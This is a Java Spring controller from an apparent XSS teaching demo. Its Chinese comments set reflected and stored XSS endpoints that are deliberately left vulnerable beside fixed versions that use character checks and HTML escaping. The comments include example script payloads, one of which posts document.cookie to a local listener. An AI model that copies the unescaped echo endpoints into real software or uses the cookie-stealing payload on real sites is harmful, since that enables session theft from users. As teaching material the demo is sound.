package org.moonzhou.xss.web;

import org.apache.commons.text.StringEscapeUtils;
import org.moonzhou.xss.constants.CommonConstants;
import org.moonzhou.xss.dto.Comment;
import org.moonzhou.xss.dto.User;
import org.moonzhou.xss.service.CommentService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.servlet.ModelAndView;

import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

/**
 * @author moon-zhou <ayimin1989@163.com>
 * @version V1.0.0
 * @description
 * @date 2021/3/16 17:35
 * @since 1.0
 */
@Controller
@RequestMapping("/xss")
public class XSSController {

    /**
     * 简单的XSS测试示例，弹框
     */
    private static final String XSS_SCRIPT_ALERT = "<script>alert('it is a xss test!')</script>";

    @Autowired
    private CommentService commentService;

    /**
     * http://localhost:8080/xss/simpleDemo
     * rest接口，返回的数据直接在页面上展示
     *
     * @return
     */
    @RequestMapping("/simpleDemo")
    @ResponseBody
    String simpleDemo() {

        return XSS_SCRIPT_ALERT;
    }

    /**
     * 反射型XSS，
     * <p>
     * 因为连接里无法直接传递脚本，此处为了体现入参攻击，做了base64处理后进行处理。
     * <p>
     * 其实日常情况下，我们使用的加密方式传输，也会存在这种情况。
     * 比如用户名使用加密方式传输，到后台解密入库，如果不做格式校验，那么该字段被使用到的页面就存在xss注入漏洞。
     * <p>
     * http://localhost:8080/xss/reflectXSS/MTEx
     * http://localhost:8080/xss/reflectXSS/PHNjcmlwdD5hbGVydCgnaXQgaXMgYSB4c3MgdGVzdCEnKTwvc2NyaXB0Pg==
     *
     * @return
     */
    @RequestMapping("/reflectXSS/{xssStr}")
    @ResponseBody
    String reflectXSS(@PathVariable(name = "xssStr") String xssStr) {

        String xssContent = "error.";

        try {
            byte[] xssBytes = Base64.getUrlDecoder().decode(xssStr);
            xssContent = new String(xssBytes, "utf-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }

        return xssContent;

    }

    /*****************************************************************************/

    /**
     *
     * 进入页面
     * http://localhost:8080/xss/xssPage
     * @return
     */
    @RequestMapping("/xssPage")
    String xssPage() {
        return "xssPage";
    }

    /**
     * 页面提交请求，不做处理，直接返回
     * http://localhost:8080/xss/ajaxReflectionXSSShow
     *
     * 反射型XSS请求
     * @return
     */
    @RequestMapping("/ajaxReflectionXSSShow")
    @ResponseBody
    User ajaxReflectionXSSShow(@RequestBody User user) {
        return user;
    }

    /**
     * 输入校验：页面提交请求，处理结果并返回，避免XSS
     * http://localhost:8080/xss/ajaxWithoutReflectionXSSCheck
     *
     * 反射型XSS请求
     * @return
     */
    @RequestMapping("/ajaxWithoutReflectionXSSCheck")
    @ResponseBody
    User ajaxWithoutReflectionXSSCheck(@RequestBody User user) {

        boolean checkFlag = true;

        String username = user.getUsername();
        if (null != username) {
            for (String illegalChar : CommonConstants.ILLEGAL_CHAR) {
                if (username.contains(illegalChar)) {
                    checkFlag = false;
                    break;
                }
            }
        }

        if (!checkFlag) {
            user.setUsername("illegal char...");
        }

        return user;
    }

    /**
     * 输出编码：页面提交请求，处理结果并返回，避免XSS
     * http://localhost:8080/xss/ajaxWithoutReflectionXSSShow
     *
     * 反射型XSS请求
     * @return
     */
    @RequestMapping("/ajaxWithoutReflectionXSSShow")
    @ResponseBody
    User ajaxWithoutReflectionXSSShow(@RequestBody User user) {

        User userDto = new User();

        userDto.setUsername(StringEscapeUtils.escapeHtml4(user.getUsername()));

        return userDto;
    }

    /*****************************************************************************/

    /**
     * http://localhost:8080/xss/commentPage
     * 进入存储型XSS示例页面
     * @return
     */
    @RequestMapping("/commentPage")
    ModelAndView commentPage() {

        // 查询所有的数据展示出来
        List<Comment> commentList = commentService.getAllComment();

        ModelAndView modelAndView = new ModelAndView("commentPage");
        modelAndView.addObject("commentList", commentList);

        return modelAndView;
    }

    /**
     *
     * http://localhost:8080/xss/saveXSS
     *
     * 提交：<script>alert('it is a xss test!')</script>
     * <script>$.ajax({url:"http://localhost:8081/listener/log",type:"POST",dataType:"json",data:JSON.stringify({data:document.cookie}),processData:false,contentType:"application/json",success:function(arg){console.log(arg);console.log("监听到数据");}});</script>
     * <script>$.ajax({url:"http://localhost:8081/listener/store",type:"POST",dataType:"json",data:JSON.stringify({data:document.cookie}),processData:false,contentType:"application/json",success:function(arg){console.log(arg);console.log("监听到数据");}});</script>
     *
     * 页面提交请求，存储后返回
     * 存储型XSS请求
     * @return
     */
    @RequestMapping("/saveXSS")
    ModelAndView saveXSS(Comment comment) {

        // 保存评论
        commentService.insertComment(comment);

        // 查询所有的数据展示出来
        List<Comment> commentList = commentService.getAllComment();

        ModelAndView modelAndView = new ModelAndView("commentPage");
        modelAndView.addObject("commentList", commentList);

        return modelAndView;
    }



    /**
     *
     * http://localhost:8080/xss/querySaveXSS
     * 直接查询存储的xss内容返回
     * @return
     */
    @RequestMapping("/querySaveXSS")
    @ResponseBody
    String querySaveXSS() {
        return "xssPage";
    }

    /**
     *
     * http://localhost:8080/xss/querySaveWithoutXSS
     * 直接查询存储的xss内容，处理后返回，避免XSS
     * @return
     */
    @RequestMapping("/querySaveWithoutXSS")
    @ResponseBody
    String querySaveWithoutXSS() {
        return "xssPage";
    }
}
